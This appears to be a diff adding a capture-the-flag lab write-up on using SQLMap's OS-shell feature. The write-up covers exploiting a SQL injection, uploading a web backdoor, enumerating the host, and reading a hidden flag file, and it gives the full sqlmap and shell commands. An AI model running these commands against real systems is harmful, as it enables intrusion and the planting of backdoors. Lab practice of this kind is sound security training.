@@ -365,5 +365,166 @@ sqlmap -u "http://target/case11.php?id=1" \
 * Web Application Protection Analysis
 * Advanced Enumeration Techniques
 
+# SQLMap – OS Command Execution and Interactive Shell (2026-06-22)
 
-012745
+## Objective
+
+Practice achieving operating system command execution through SQL injection and use SQLMap's interactive OS shell to enumerate the host and locate sensitive files.
+
+---
+
+## Goal
+
+Gain an interactive shell on the remote host and retrieve a second flag stored on the system.
+
+---
+
+## Initial Enumeration
+
+The target contained an SQL injection vulnerability in the GET parameter `id`:
+
+```text
+http://target/?id=1
+```
+
+I leveraged SQLMap's OS shell functionality:
+
+```bash
+sqlmap -u "http://target/?id=1" --os-shell --technique=E
+```
+
+SQLMap identified:
+
+- DBMS: MariaDB/MySQL
+- Operating System: Debian Linux
+- Web Server: Apache 2.4
+- Language: PHP
+
+---
+
+## Uploading the Web Backdoor
+
+SQLMap attempted several writable directories and successfully uploaded a stager and backdoor into:
+
+```text
+/var/www/html/
+```
+
+After uploading the web shell, SQLMap provided an interactive command prompt:
+
+```text
+os-shell>
+```
+
+---
+
+## Initial Host Enumeration
+
+I began by listing the contents of the current directory:
+
+```bash
+ls -la
+```
+
+This revealed several files including:
+
+```text
+flag.txt
+common.inc.php
+basic.php
+index.php
+template.php
+```
+
+I inspected the obvious `flag.txt`, but it was not the expected flag.
+
+---
+
+## Searching for Additional Flags
+
+I searched the filesystem for files containing the word "flag":
+
+```bash
+find / -type f | grep flag
+```
+
+This revealed:
+
+```text
+/var/lib/mysql/debian-10.3.flag
+/var/www/html/flag.txt
+/flag.txt
+```
+
+Initially, I had only inspected:
+
+```text
+/var/www/html/flag.txt
+```
+
+---
+
+## Using the Hint
+
+The challenge hint stated:
+
+> The flag is in a very common directory!
+
+Realizing I had overlooked the second result, I investigated:
+
+```bash
+cat /flag.txt
+```
+
+### Result
+
+The second flag was located directly in the root directory:
+
+```text
+/flag.txt
+```
+
+and was readable by the `www-data` user.
+
+---
+
+## Key Takeaways
+
+* SQLMap can provide interactive OS command execution through `--os-shell`.
+* SQLMap uploads a web backdoor when direct command execution is possible.
+* Host enumeration is a critical post-exploitation step.
+* Obvious files are not always the correct target.
+* Hints can help narrow the search when multiple files exist.
+* Always verify every result returned by enumeration commands.
+* Simple oversights can prevent finding important information.
+
+---
+
+## Commands Used
+
+```bash
+# Obtain an interactive OS shell
+sqlmap -u "http://target/?id=1" --os-shell --technique=E
+
+# Enumerate current directory
+ls -la
+
+# Search for files containing "flag"
+find / -type f | grep flag
+
+# Read the final flag
+cat /flag.txt
+```
+
+## Skills Practiced
+
+* SQL Injection Exploitation
+* SQLMap OS Command Execution
+* Interactive Shell Usage
+* Web Backdoor Deployment
+* Linux Enumeration
+* File Discovery
+* Post-Exploitation Techniques
+* Privilege Awareness
+* Information Gathering
+* Problem Solving and Attention to Detail
